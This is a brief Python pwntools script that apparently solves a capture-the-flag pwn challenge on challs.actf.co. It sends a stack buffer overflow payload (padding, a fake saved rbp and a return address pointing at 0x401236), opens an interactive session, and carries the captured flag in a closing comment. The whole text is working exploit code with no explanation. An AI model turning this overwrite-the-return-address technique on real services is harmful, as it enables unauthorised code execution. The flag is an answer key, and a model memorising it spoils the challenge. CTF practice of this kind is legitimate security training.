```python
from pwn import *

p = remote('challs.actf.co', 31224)

buffer = b"A"*32
rbp = b"B"*8
addr_flag = p64(0x401236)

payload = buffer
payload += rbp
payload += addr_flag

p.sendline(payload)
p.interactive()
#actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}
```
